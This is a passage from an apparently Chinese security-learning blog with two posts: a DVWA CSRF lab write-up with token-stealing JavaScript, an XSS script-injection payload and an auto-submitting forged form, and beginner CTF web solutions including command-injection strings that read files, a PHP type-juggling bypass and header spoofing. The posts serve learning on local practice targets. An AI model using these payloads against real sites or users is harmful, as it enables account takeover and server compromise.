class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
-<p>当被攻击者访问这个页面时，会出现假的404错误，被攻击者会认为自己进入了一个无效的网站，但实际上攻击已经产生了。</p>
-<h2 id="medium难度"><a href="#medium难度" class="headerlink" title="medium难度"></a>medium难度</h2><p>首先查看源码，发现比low多了一个判断</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">'HTTP_REFERER'</span> ] ,$_SERVER[ <span class="string">'SERVER_NAME'</span> ]) !== <span class="keyword">false</span> ) &#123;</span><br><span class="line">		<span class="comment">// Get input</span></span><br><span class="line">		$pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">		$pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br></pre></td></tr></table></figure>
-<p>也就是说，Medium级的代码检查了保留变量 HTTP_REFERER(http包头的Referer参数的值，表示来源地址）中是否包含SERVER_NAME这一个方法来抵御csrf攻击，但是这种方式只需要将刚才那个页面名字修改为本地IP地址就可。<br><img src="https://img-blog.csdnimg.cn/20201112234808579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="源码"><br>这里看到预期修改为password，点击页面后，回到原来页面，测试发现密码修改成功。<img src="https://img-blog.csdnimg.cn/20201112234904680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="虚假404页面"><br><img src="https://img-blog.csdnimg.cn/2020111223492247.png#pic_center" alt="修改成功"></p>
-<h2 id="high难度"><a href="#high难度" class="headerlink" title="high难度"></a>high难度</h2><p>查看源码<br>发现比起medium多了一个</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">	<span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">	checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br></pre></td></tr></table></figure>
-<p>很明显high级的难度在防御机制中加入了token元素。即<code>用户每次访问改密页面时，服务器会返回一个随机的token。向服务器发起请求时，需要提交token参数。而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</code><br>看了大佬博客之后发现可以构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成 CSRF 攻击。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">'http://127.0.0.1/DVWA/vulnerabilities/csrf/'</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">    xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">    xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">            <span class="keyword">var</span> regex = <span class="regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;</span><br><span class="line">            <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">            <span class="built_in">console</span>.log(match);</span><br><span class="line">            alert(match[<span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">var</span> new_url = <span class="string">'http://127.0.0.1/DVWA/vulnerabilities/csrf/?user_token='</span>+token+<span class="string">'&amp;password_new=password&amp;password_conf=password&amp;Change=Change'</span>;</span><br><span class="line">                    <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                        count++;</span><br><span class="line">                        xmlhttp.open(<span class="string">"GET"</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                        xmlhttp.send();</span><br><span class="line">                    &#125;</span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xmlhttp.open(<span class="string">"GET"</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">    xmlhttp.send();</span><br></pre></td></tr></table></figure>
-<p>将其放在攻击者的网络上，我由于是本地实验，所以放在了<code>http://127.0.0.1/xss.js</code>，然后心细的人发现了，这个应该是xss攻击吧？没错，看大佬博客使用的就是xss和csrf相结合的方法实现攻击的。<br>然后构造payload：<code>http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English #&lt;script src=&quot;http://www.127.0.0.1.com/xss.js&quot;&gt;&lt;/script&gt;</code></p>
-<p>然后诱导被攻击者点击这个链接实现攻击操作。<br>但是自身实践出现错误，百度发现，现在的浏览器不允许跨域访问，所以求教了大师傅之后，发现了另一个方法，bp抓包，修改参数。看了团队内的大佬博客之后，知道可以利用<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code>来实现token获取。<br>在DVWA的xss页面，进行抓包<img src="https://img-blog.csdnimg.cn/20201113003432172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="抓包"><br>修改参数<br><img src="https://img-blog.csdnimg.cn/20201113003528807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="修改"><br>之后进行放包。得到浏览器页面<br><img src="https://img-blog.csdnimg.cn/20201113003559763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="浏览器页面"><br>在这里修改密码<br><img src="https://img-blog.csdnimg.cn/20201113003623505.png#pic_center" alt="得到token"><br>然后构造一个自动点击的页面</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">"GET"</span> action=<span class="string">"http://127.0.0.1/dvwa/vulnerabilities/csrf"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_new"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"password"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">'hidden'</span> name=<span class="string">'user_token'</span> value=<span class="string">"8c662c2b09db59c12c190ffd8ec23a00"</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span> id=<span class="string">"onlick"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"onclick"</span>).click();</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
-<p>然后诱导用户点击，<img src="https://img-blog.csdnimg.cn/20201113004503268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="修改成功"><br>修改成功。</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>对于impossible难度暂时没有打算尝试，毕竟high难度还有点一知半解，等后期更加深入了解了之后再回来补充。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/09/18/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98%E5%B0%8F%E7%BB%93%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E5%85%A5%E9%97%A8%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/18/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E5%81%9A%E9%A2%98%E5%B0%8F%E7%BB%93%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E5%85%A5%E9%97%A8%EF%BC%89/" class="post-title-link" itemprop="url">第一周学习做题小结（攻防世界web入门）</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2020-09-18 00:50:03 / Modified: 00:50:10" itemprop="dateCreated datePublished" datetime="2020-09-18T00:50:03+08:00">2020-09-18</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="攻防世界新手web题"><a href="#攻防世界新手web题" class="headerlink" title="攻防世界新手web题"></a>攻防世界新手web题</h2><h3 id="（一）view-source"><a href="#（一）view-source" class="headerlink" title="（一）view-source"></a>（一）view-source</h3><p><img src="https://img-blog.csdnimg.cn/202009131506121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>获取在线场景后，进入，这里有几种方法做题。<br><strong>第一种</strong> ：进入后，按F12打开控制器可以找到flag。<br><strong>第二种</strong> ：brupsuit抓包，在浏览器请求时抓取flag。<br><strong>第三种</strong> ：查看网页源代码。</p>
-<h3 id="（二）get-post"><a href="#（二）get-post" class="headerlink" title="（二）get_post"></a>（二）get_post</h3><p><img src="https://img-blog.csdnimg.cn/20200913151019357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里我用的是火狐浏览器解决。<br>打开在线场景，在url后面加上 <code>?a=2</code> ,接着出现post内容，在浏览器搜索框下面打开Post data ，输入<code>b=4</code> 出现flag。</p>
-<h3 id="（三）backup"><a href="#（三）backup" class="headerlink" title="（三）backup"></a>（三）backup</h3><p><img src="https://img-blog.csdnimg.cn/20200913151356863.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php的备份文件名：如果网站存在备份文件，常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” </span><br><span class="line">依次输入后缀名尝试。</span><br></pre></td></tr></table></figure>
-<p>在输入index.php后页面没反应，然后依次尝试，发现输入.bak时提示下载.bak文件。下载打开发现flag。<br><img src="https://img-blog.csdnimg.cn/20200913151648879.png#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="（四）robots"><a href="#（四）robots" class="headerlink" title="（四）robots"></a>（四）robots</h3><p><img src="https://img-blog.csdnimg.cn/20200913152414648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>进入后发现页面空白，然后第一感觉查看网页源代码，发现<img src="https://img-blog.csdnimg.cn/20200913152726715.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后就百度了一下robots，</p>
-<blockquote>
-<p>robots协议也叫robots.txt（统一小写）是一种存放于网站根目录下的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称网络蜘蛛），此网站中的哪些内容是不应被搜索引擎的漫游器获取的，哪些是可以被漫游器获取的。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。robots.txt应放置于网站的根目录下。如果想单独定义搜索引擎的漫游器访问子目录时的行为，那么可以将自定的设置合并到根目录下的robots.txt，或者使用robots元数据（Metadata，又称元数据）。</p>
-</blockquote>
-<p>那这样就直接在网站url后面加一个<code>robots.txt</code> 发现了一个名字为</p>
-<p><img src="https://img-blog.csdnimg.cn/20200913152948922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接着再次搜索url+<code>flag_1s_h3re.php</code> ，得到flag。</p>
-<h3 id="（五）cookie"><a href="#（五）cookie" class="headerlink" title="（五）cookie"></a>（五）cookie</h3><blockquote>
-<p> Cookie是当主机访问Web服务器时，由 Web 服务器创建的，将信息存储在用户计算机上的文件。一般网络用户习惯用其复数形式 Cookies，指某些网站为了辨别用户身份、进行 Session 跟踪而存储在用户本地终端上的数据，而这些数据通常会经过加密处理。</p>
-</blockquote>
-<p>打开题目，这题我知道两种解题方式。<br>第一种：打开在线场景，F12打开控制器，发现有一个look-here的cookie值为cookie.php。直接url后加<code>cookie.php</code> 搜索发现让我们看<code>http response</code> ，然后在http响应包里面发现头文件包含flag的信息。<br>第二种：brupsuit抓包。步骤和第一种差不多。<br><img src="https://img-blog.csdnimg.cn/20200913154308955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包后发现一个look-here的值，然后搜索url+<code>cookie.php</code> ，接着抓包，在其中发现flag。<br><img src="https://img-blog.csdnimg.cn/20200913154620406.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="（六）disabled-button"><a href="#（六）disabled-button" class="headerlink" title="（六）disabled button"></a>（六）disabled button</h3><p>打开题目发现有一个flag按钮，这一题我当时是鼠标右键查看网页源代码，发现有个post方式。<br><img src="https://img-blog.csdnimg.cn/20200913154813462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="
-"></p>
-<p>于是就直接post<code>auth=flag</code> 得出flag。<br><img src="https://img-blog.csdnimg.cn/20200913154916964.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在看了大佬们的讨论后，发现了另外一种方式。<br><strong>F12打开控制器，里面的html格式里有一个disable，选择之后删除，发现flag按钮可以点了，得出了flag。</strong></p>
-<h3 id="（七）weak-auth"><a href="#（七）weak-auth" class="headerlink" title="（七）weak auth"></a>（七）weak auth</h3><p>打开之后给了一个登录的界面<br><img src="https://img-blog.csdnimg.cn/20200913155240661.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>刚开始想试一下绕过的，发现提示了用户名是<code>admin</code>，然后就随手来了一个密码<code>123456</code>，突然就正确了，得到了flag。amazing！<br><img src="https://img-blog.csdnimg.cn/20200913155408235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后这道题做的话，可以用抓包来做，随便输入一个账户密码，brupsuit抓到后就对账户密码进行爆破，最后得到一个长度不一样的就是正确的，字典的话可以自己写一个，小弟知识有限就不在这里出丑了。</p>
-<h3 id="（八）Ping"><a href="#（八）Ping" class="headerlink" title="（八）Ping"></a>（八）Ping</h3><p>题目提示<strong>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</strong><br>打开之后，直接ping了一下本机IP地址。ping通过了，然后接着顺带扫了一下带有<strong>“.txt”</strong> 的文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|find / -name <span class="string">"*.txt"</span></span><br></pre></td></tr></table></figure>
-<p>得到了<img src="https://img-blog.csdnimg.cn/20200913160057532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>然后就查看flag文件的内容</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|cat /home/flag.txt</span><br></pre></td></tr></table></figure>
-<p>得到<br><img src="https://img-blog.csdnimg.cn/20200913160224991.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>127.0.0.1</strong> ：</p>
-<blockquote>
-<p>127.0.0.1是回送地址，指本地机，一般用来测试使用。回送地址（127.x.x.x）是本机回送地址（Loopback Address），即主机IP堆栈内部的IP地址，主要用于网络软件测试以及本地机进程间通信，无论什么程序，一旦使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</p>
-</blockquote>
-<h3 id="（九）simple-php"><a href="#（九）simple-php" class="headerlink" title="（九）simple_php"></a>（九）simple_php</h3><p>听名字就知道是php方面简单的知识了，打开一看，果然不难，新手就是爽。<br>这个题考察的是PHP的函数绕过</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">﻿<span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line">$a=@$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=@$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>($a==<span class="number">0</span> <span class="keyword">and</span> $a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_numeric($b))&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($b&gt;<span class="number">1234</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>打开是这样的，然后就百度一下<code>is_number()</code>函数，发现是判断目标是否为数字，是的话输出<strong>true</strong> 不是的话输出<strong>false</strong></p>
-<blockquote>
-<p>.is_numeric() 函数会判断如果是数字和数字字符串则返回 TRUE，否则返回<br>FALSE,且php中弱类型比较时，会使(‘1234a’ == 1234)为真</p>
-</blockquote>
-<p>而题中所给代码首先需要满足 $a==0 $a两个条件<br>php中的弱类型比较会使’0dsafd’为真，所以输入这个时会输出flag1。<br>而输入<code>?a=0dsafd&amp;b=1235dcas</code> 则会出现flag<br><img src="https://img-blog.csdnimg.cn/20200913161611802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<h3 id="（十）xff-referer"><a href="#（十）xff-referer" class="headerlink" title="（十）xff_referer"></a>（十）xff_referer</h3><p>刚拿到题目有点摸不着头脑，不知道怎么下手。然后本着习惯就先按了F12，我先按为敬了。然后发现自己好菜，就问了我万能的师傅-度娘。了解了一下 xff和referer。发现</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用我的菜鸟观来说，xff就是用来构造IP地址，referer就是让你构造的来源IP相应的来源浏览器，规定好像是使用www.google.com</span><br></pre></td></tr></table></figure>
-<p>这样就好办了，直接在控制窗口网络页面重新发送一个请求，加入</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-<span class="keyword">For</span>:<span class="number">123.123</span><span class="number">.123</span><span class="number">.123</span></span><br><span class="line">Referer:https:<span class="comment">//www.google.com</span></span><br></pre></td></tr></table></figure>
-<p>然后发送请求，在HTML页面发现flag。<br><img src="https://img-blog.csdnimg.cn/20200913204725730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>还有另外一种解法就是拿出咱们的神器<strong>brupsuit</strong> 来进行抓包。原理都是一样的。<br>进行抓包然后发送到referer，添加上面的玩意，然后<strong>GO</strong> 发送，在同样的地方拿到了一样的flag。就很nice。</p>
-<h3 id="（十一）webshell"><a href="#（十一）webshell" class="headerlink" title="（十一）webshell"></a>（十一）webshell</h3><p>webshell，打开题目发现只有一个提示<br><img src="https://img-blog.csdnimg.cn/20200918003124550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>第一时间想到了<code>post</code>一个<code>shell=flag</code>试一下。发现并没有什么反应。然后联想题目提示PHP一句话。又想到了webshell后门。于是拿出了中国菜刀这个神器。<br><img src="https://img-blog.csdnimg.cn/20200918003741390.png#pic_center" alt="在这里插入图片描述"><br>直接添加url，密码<code>shell</code>，得到flag。</p>
-<h3 id="（十二）simple-js"><a href="#（十二）simple-js" class="headerlink" title="（十二）simple_js"></a>（十二）simple_js</h3><p>这个题目完全的标题欺骗萌新，刚拿到就一直在研究其中的js代码。因为刚接触，就研究了一会才发现ji代码在这个题目中毫无用处。<br><img src="https://img-blog.csdnimg.cn/20200918004540724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查看页面源代码，发现一串子疑似十六进制的字符。猜测是flag。就进行转换。<br>这里用的脚本，贪方便，就网上找了一个，接下来会研究python脚本的。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span></span><br><span class="line">print(a)</span><br><span class="line">b=a.split(<span class="string">","</span>)</span><br><span class="line">c=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    i=chr(int(i))</span><br><span class="line">    c+=i</span><br><span class="line">    print(c)</span><br></pre></td></tr></table></figure>
-<p>运行得到flag。<br><img src="https://img-blog.csdnimg.cn/20200918004832480.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MDQxNzIz,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>再加上flag格式提交即可。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://momaxx.github.io/2020/05/22/PHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%BC%B9/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="moMaxX">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Momax's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/05/22/PHP%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%E7%AC%AC%E5%9B%9B%E5%BC%B9/" class="post-title-link" itemprop="url">PHP入门学习第四弹</a>
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
